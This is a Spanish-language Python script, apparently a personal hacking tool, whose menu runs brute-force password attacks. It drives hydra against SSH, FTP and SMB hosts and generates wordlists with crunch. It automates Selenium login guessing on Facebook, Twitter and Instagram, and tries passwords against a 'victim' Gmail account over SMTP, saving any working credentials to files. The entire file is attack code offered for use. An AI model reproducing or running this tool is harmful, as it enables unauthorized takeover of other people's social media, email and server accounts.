from selenium import webdriver
from keyboard import press
from colorama import Fore, init
import keyboard
import os
import time
import smtplib
init()

os.system("clear")

ruta = os.getcwd() + "/salida/"

def ftp(ip,usuario):
    print(Fore.YELLOW + "")
    print("Recuerde que tiene que colocar las claves en el archivo diccionario.txt\n")
    input("Si ya lleno en alchivo oprimir cualquier tecla para continuar..")
    os.system("hydra -l "+ usuario +" -P diccionario.txt ftp://"+ ip + " > " + ruta + "ftp:" + ip + ".txt")
    
def ssh(ip,usuario):
    print(Fore.YELLOW + "")
    print("Recuerde que tiene que colocar las claves en el archivo diccionario.txt\n")
    input("Si ya lleno en alchivo oprimir cualquier tecla para continuar..")
    os.system("hydra -l "+ usuario +" -P diccionario.txt -t 4 ssh://"+ ip + " > " + ruta + "ssh:" + ip + ".txt")

def twitterPassword():

    print("Recuerde que tiene que abrir el archivo claves_social.txt y colocar las contraseñas una debajo de la otra\n")
    input("Si ya tiene esta lista con las contraseñas presione una tecla, si no, aun esta a tiempo de colocarlas ")

    #Verificamos que la lista de calves exista
    try:
        diccionario_claves = open('claves_social.txt', 'r') #Abrimos el archivo

    except:
            print("\n No se encontro la lista de las claves")
            time.sleep(2)
            return

    #Definimos el correo al cual se le probaran las claves
    usuario = input("Dijite el correo electronico: ")

    ruta = os.getcwd() + "/salida/"

    #Definimos la variable del webdriver y la ruta donde este se encuentra
    driver = webdriver.Firefox()

    #Definimos la clave
    clave = diccionario_claves.readline()

    driver.get('https://twitter.com/login')
    time.sleep(2)

    def twitter():
        
        driver.find_element_by_name("session[username_or_email]").send_keys(usuario)
        time.sleep(1)

        driver.find_element_by_name("session[password]").send_keys(clave.strip())
        time.sleep(1)

        driver.find_element_by_xpath("/html/body/div/div/div/div[2]/main/div/div/div[1]/form/div/div[3]/div/div").click()
        time.sleep(3)

        #Capturamos la url para comprobar que la cuenta si inicio sesion
        url_actual = driver.current_url

        if url_actual == "https://twitter.com/home":
            print("\n Clave Encontrada")

            #Se procede a habrir un archivo para colocar las cuentas procesadas las que funcionan
            f = open(ruta + "cuentas_procesadas_twitter.txt" , "a")
            f.write("\n" + usuario + " -----> " + clave.strip() + " (Funciona)\n")
            f.close()
            driver.quit() #cerrar el navegador
            time.sleep(2)
            return

        else:
            #Si la cuenta no funciona de vuelve a cargar el login
            driver.get("https://twitter.com/login")

            #Se procede a Abrir un archivo para colocar las cuentas procesadas las que no funcionan
            f = open(ruta + "cuentas_procesadas_twitter.txt" , "a")
            f.write("\n" + usuario + " -----> " + clave.strip() + " (No Funciona)\n")
            f.close()

            time.sleep(4)
            return

    #Utilizamos en ciclo while para parar el codigo cuando no queden cuentas por comprobar
    #Y no repetir los que ya se procesaron
    while clave != "":
        twitter()
        clave = diccionario_claves.readline()

    driver.quit() #cerrar el navegador

def facebookPassword():
    print("Recuerde que tiene que abrir el archivo claves_social.txt y colocar las contraseñas una debajo de la otra\n")
    input("Si ya tiene esta lista con las contraseñas presione una tecla, si no, aun esta a tiempo de colocarlas ")

    #Verificamos que la lista de calves exista
    try:
        diccionario_claves = open('claves_social.txt', 'r') #Abrimos el archivo

    except:
            print("\n No se encontro la lista de las claves")
            time.sleep(2)
            return

    #Definimos el correo al cual se le probaran las claves
    usuario = input("Dijite el correo electronico: ")

    #Definimos la variable del webdriver y la ruta donde este se encuentra
    driver = webdriver.Firefox()

    #Asignamos variables tanto para las claves
    #Leemos linea por linea del archivo 
    clave = diccionario_claves.readline()

    #Abrimos un navegador y accedemos a la pagina de facebook
    driver.get("https://www.facebook.com/login")
    time.sleep(2)

    #Nos aseguramos que sea la pagina de facebook verificando el titulo
    assert "Facebook" in driver.title

    #Definimos la funciona para realizar el proceso de login y cerrar sesion

    def facebook():
        time.sleep(2)

        #Inicio bloque de codigo para ingresar el correo en el campo de correo
        box_usuario = driver.find_element_by_id("email")
        box_usuario.clear()
        box_usuario.send_keys(usuario)
        print("\n Usuario ingresado")
        time.sleep(2)
        #Fin bloque correo

        #Inicio bloque de codigo para ingresar la clave
        box_clave = driver.find_element_by_id("pass")
        box_clave.clear()
        box_clave.send_keys(clave.strip())
        print("\n clave ingresada")
        time.sleep(2)
        #Fin bloque correo

        #Boton para iniciar sesion
        box_entrar = driver.find_element_by_id("loginbutton").click()

        #Capturamos la url para comprobar que la cuenta si inicio sesion
        url_actual = driver.current_url

        if url_actual == "https://www.facebook.com/":
            print("\n Clave Encontrada")

            #Se procede a habrir un archivo para colocar las cuentas procesadas las que funcionan
            f = open(ruta + "cuentas_procesadas_facebook.txt" , "a")
            f.write("\n" + usuario + " -----> " + clave.strip() + " (Funciona)\n")
            f.close()
            driver.quit() #cerrar el navegador
            time.sleep(2)
            return

        else:
            #Si la cuenta no funciona de vuelve a cargar el login
            driver.get("http://www.facebook.com/login")

            #Se procede a Abrir un archivo para colocar las cuentas procesadas las que no funcionan
            f = open(ruta + "cuentas_procesadas_facebook.txt" , "a")
            f.write("\n" + usuario + " -----> " + clave.strip() + " (No Funciona)\n")
            f.close()

            time.sleep(4)
            return

    #Utilizamos en ciclo while para parar el codigo cuando no queden cuentas por comprobar
    #Y no repetir los que ya se procesaron
    while clave != "":
        facebook()
        clave = diccionario_claves.readline()

    driver.quit() #cerrar el navegador

def instagramPassword():

    print("Recuerde que tiene que abrir el archivo claves_social.txt y colocar las contraseñas una debajo de la otra\n")
    input("Si ya tiene esta lista con las contraseñas presione una tecla, si no, aun esta a tiempo de colocarlas ")

    #Verificamos que la lista de calves exista
    try:
        diccionario_claves = open('claves_social.txt', 'r') #Abrimos el archivo

    except:
            print("\n No se encontro la lista de las claves")
            time.sleep(2)
            return

    #Definimos el correo al cual se le probaran las claves
    usuario = input("Dijite el correo electronico: ")

    ruta = os.getcwd() + "/salida/"

    #Definimos la variable del webdriver y la ruta donde este se encuentra
    driver = webdriver.Firefox()

    #Definimos la clave
    clave = diccionario_claves.readline()

    driver.get('https://www.instagram.com/accounts/login/')
    time.sleep(2)

    def instagram():
        
        driver.find_element_by_name("username").send_keys(usuario)
        time.sleep(1)

        driver.find_element_by_name("password").send_keys(clave.strip())
        time.sleep(1)

        press('TAB')
        time.sleep(2)
        press('TAB')

        time.sleep(2)
        press('ENTER')

        #Capturamos la url para comprobar que la cuenta si inicio sesion
        url_actual = driver.current_url

        if url_actual == "https://www.instagram.com":
            print("\n Clave Encontrada")

            #Se procede a habrir un archivo para colocar las cuentas procesadas las que funcionan
            f = open(ruta + "cuentas_procesadas_instagram.txt" , "a")
            f.write("\n" + usuario + " -----> " + clave.strip() + " (Funciona)\n")
            f.close()
            driver.quit() #cerrar el navegador
            time.sleep(2)
            return

        else:
            #Si la cuenta no funciona de vuelve a cargar el login
            driver.get("https://www.instagram.com/accounts/login/")

            #Se procede a Abrir un archivo para colocar las cuentas procesadas las que no funcionan
            f = open(ruta + "cuentas_procesadas_instagram.txt" , "a")
            f.write("\n" + usuario + " -----> " + clave.strip() + " (No Funciona)\n")
            f.close()

            time.sleep(4)
            return

    #Utilizamos en ciclo while para parar el codigo cuando no queden cuentas por comprobar
    #Y no repetir los que ya se procesaron
    while clave != "":
        instagram()
        clave = diccionario_claves.readline()

    driver.quit() #cerrar el navegador

def smtpGmail():
    print(Fore.YELLOW + "")
    print("Recuerde que tiene que colocar las claves en el archivo diccionario.txt\n")
    input("Si ya lleno en alchivo oprimir cualquier tecla para continuar..")

    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
    print("\n")
    email = input("Email de la victima: ")
    dic = open("diccionario.txt", "r")
 
    for pwd in dic:
        try:
            smtpserver.login(email, pwd)
            resultado = print("Contraseña Correcta: %s"  % pwd)
            f = open(ruta + "gmail.txt" , "a")
            f.write("\n" + email + " -----> " + pwd + " (Funciona)\n")
            f.close()
            break;
            
        except smtplib.SMTPAuthenticationError:
            resultado = print("Contraseña Incorrecta: %s" % pwd)
            f = open(ruta + "gmail.txt" , "a")
            f.write("\n" + email + " -----> " + pwd + " (No Funciona)\n")
            f.close()

def smb(ip):
    print("Recuerde que tiene que abrir el archivo smb_usuario.txt y diccionario.txt para colocar las credenciales\n")
    input("Si ya tiene esta lista con las contraseñas y usuarios presione una tecla, si no, aun esta a tiempo de colocarlas ")

    os.system("hydra -L smb_usuario.txt -P diccionario.txt " + ip + " smb " + " > " + ruta + "smb:" + ip + ".txt")

def diccionario(min,max):
    os.system("crunch " + min + " " + max + " > " + ruta + "diccionario.txt")

def menu():
    os.system('clear')
    print(Fore.YELLOW + "")
    print("""
░█████╗░██╗░░░██╗██████╗░███████╗██╗░░░░░██╗░█████╗░  
██╔══██╗██║░░░██║██╔══██╗██╔════╝██║░░░░░██║██╔══██╗  
███████║██║░░░██║██████╔╝█████╗░░██║░░░░░██║██║░░██║  
██╔══██║██║░░░██║██╔══██╗██╔══╝░░██║░░░░░██║██║░░██║  
██║░░██║╚██████╔╝██║░░██║███████╗███████╗██║╚█████╔╝  
╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░╚════╝░  

██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░
██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░
███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░
██╔══██║██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗
██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░""")
    print(Fore.GREEN + "-------------------------CARGANDO")
    print(Fore.GREEN + "")
    print(Fore.GREEN + "Selecionar una opcion")
    print(Fore.YELLOW + "\t1) Crear diccionario ")
    print("\t2) Ataque de fuerza bruta por SSH")
    print("\t3) Ataque de fuerza bruta por SMB")
    print("\t4) Ataque de fuerza bruta por FTP")
    print("\t5) Ataque de fuerza bruta por SMTP GMAIL")
    print("\t6) Ataque de fuerza bruta por FACEBOOK")    
    print("\t7) Ataque de fuerza bruta por TWITTER")
    print("\t8) Ataque de fuerza bruta por INSTAGRAM")
    print("\t9) salir")

while True:
    menu()

    opcionMenu = input(Fore.GREEN + "Ingresar una opcion: ")

    if opcionMenu == '4':
        ip = input("Ingresar la direccion a explotar: ")
        usuario = input("Ingresar el usuario del ftp: ")
        ftp(ip,usuario)

    elif opcionMenu == '2':
        ip = input("Ingresar la direccion a explotar: ")
        usuario = input("Ingresar el usuario del ssh: ")
        ssh(ip,usuario)

    elif opcionMenu == '6':
        facebookPassword()

    elif opcionMenu == '5':
        smtpGmail()

    elif opcionMenu == '3':
        ip = input("Ingresar ip: ")
        smb(ip)

    elif opcionMenu == '1':
        min = input("Ingresar valor minimo : ")
        max = input("Ingresar valor maximo : ")
        diccionario(min,max)

    elif opcionMenu == '7':
        twitterPassword()

    elif opcionMenu == '8':
        instagramPassword()

    elif opcionMenu == '9':
        break

